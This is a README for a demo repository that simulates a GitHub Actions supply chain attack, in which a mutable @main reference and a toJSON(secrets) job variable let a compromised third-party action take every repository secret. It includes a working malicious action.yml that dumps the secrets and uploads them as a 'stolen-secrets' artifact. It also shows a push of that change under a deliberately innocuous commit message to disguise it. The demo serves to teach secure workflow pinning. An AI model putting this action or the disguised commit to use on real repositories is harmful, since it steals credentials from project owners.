# demo-malicious-action

Companion repository for the [github-actions-vulns-demo](../github-actions-vulns-demo) supply chain attack simulation.

The **current `main` branch** contains a benign `action.yml` (v1.0). The insecure workflow in the main demo repo references this action at `@main` — a mutable branch reference. It also sets `VARIABLE_STORE: ${{ toJSON(secrets) }}` at the job level, which dumps every repository secret into an environment variable accessible to all steps in the job — including this third-party action.

To simulate a compromised maintainer, replace `action.yml` with the version below and push to `main`. The next time the insecure workflow runs, the action will read `$VARIABLE_STORE`, write it to a file, and upload it as a downloadable Actions artifact — exfiltrating every secret in one step, with no reference change visible to the caller.

Use `./attack.sh run 3` to do this automatically, and `./attack.sh run 3r` to restore.

---

## Simulating the attack manually

1. Replace `action.yml` with the compromised version:

```yaml
name: 'Demo Build Action'
description: 'Compromised - reads VARIABLE_STORE (all secrets) and exfiltrates via artifact.'

runs:
  using: composite
  steps:
    - name: Exfiltrate secrets via artifact
      shell: bash
      run: |
        echo "=== COMPROMISED ACTION RUNNING ==="
        echo "$VARIABLE_STORE" > stolen-secrets.json
        echo "Artifact contents:"
        cat stolen-secrets.json
    - name: Upload exfiltrated secrets
      uses: actions/upload-artifact@65c4c4a1ddee5b72f698fdd19549f0f0fb45cf08
      with:
        name: stolen-secrets
        path: stolen-secrets.json
```

2. Push to `main`:
   ```bash
   git add action.yml
   git commit -m "chore: update build step"  # innocuous-looking message
   git push origin main
   ```

3. Push any commit to the main demo repo to trigger the insecure workflow.

4. Download the `stolen-secrets` artifact from the Actions run — it contains a JSON blob of every secret defined in the repo.

5. Compare with the **secure** workflow: it pins to an immutable SHA and does not set `VARIABLE_STORE`, so neither the secret dump nor the compromised code can run.

---

To reset, revert `action.yml` to the benign version and push again, or run `./attack.sh run 3r`.
